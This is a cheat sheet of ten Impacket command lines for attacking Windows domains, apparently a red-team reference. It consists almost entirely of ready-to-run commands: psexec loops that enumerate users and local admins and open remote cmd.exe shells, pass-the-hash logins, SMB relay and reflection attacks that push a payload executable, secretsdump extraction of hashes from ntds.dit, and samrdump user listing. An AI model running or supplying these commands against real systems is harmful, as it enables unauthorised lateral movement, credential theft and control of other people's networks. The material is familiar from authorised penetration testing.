### 1. loop for who is where
```
for host in $(cat userhosts.txt); do echo $host; psexec.py [DOMAIN]/[user]:'[pass]'@$host 'WMIC ComputerSystem Get UserName'; done | tee loggedin-dirty.txt;cat loggedin-dirty.txt | grep -v "^\[" | grep -v "^Impacket" | grep -v "^Trying" | grep -v "SMB SessionError" | sed '/^$/d'
```
**- loop,enumeration,user information,smb,impacket**
#### References:

https://yg.ht
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 2. loop to look for dual homed hosts
```
for host in $(cat ../nmap/IPs-SMB.txt); do echo $host; psexec.py [DOMAIN]/[user]:'[pass]'@$host "ipconfig"; done | grep "IPv4 Address\|Ethernet adapter\|^[0-9]" | sed '/^$/d' | tee dualhomed-search.txt
```
**- networking,loop,enumeration,impacket**
#### References:

https://yg.ht
https://technet.microsoft.com/en-gb/library/bb490921.aspx
__________
### 3. loop to find local admins
```
for i in `cat smb_up `; do timeout 10 psexec.py [user]:[pass]@$i net localgroup administrators; done | tee local_admin_information
```
**- linux,loop,enumeration,user information,impacket**
#### References:

https://technet.microsoft.com/en-us/library/bb490706.aspx
__________
### 4. connect to mssql
```
/opt/impacket/examples/mssqlclient.py [user]:[pass]@[ip] -port [port]
```
**- linux,mssql,impacket**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 5. loop around and open cmd, Psexecy.py != psexec msf != sysinternals psexec
```
for host in $(cat hosts.txt); do psexec.py [DOM]/[USER]:'[PASS]'@$host "cmd.exe"; done
```
**- linux,loop,impacket,remote command shell**
#### References:

https://yg.ht
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 6. PSExec with hashses
```
psexec.py -hashes [LM]:[NTLM] [DOM]/[USER]@[TARGET] "cmd.exe"
```
**- linux,impacket,remote command shell,hashes**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 7. smbrelay targeted
```
smbrelayx.py -h [TARGETIP] -e [PAYLOAD exe]
```
**- linux,smb,MitM,Windows,impacket,privilege escalation**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 8. smbrelay reflection : note read into http -> smb refelction
```
smbrelayx.py -e [PAYLOAD exe]
```
**- linux,smb,MitM,Windows,impacket,privilege escalation**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 9. Parse the SYSTEM and ntds with impacket
```
secretsdump.py  -hashes LMHASH:NTHASH -system ../SYSTEM -ntds ../ntds.dit local | tee hashes
```
**- Windows,impacket,hashes**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 10. List users of the remote system
```
samrdump.py -hashes [LMHASH:NTHASH] [user]:[pass]@[victim]
```
**- linux,enumeration,impacket**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
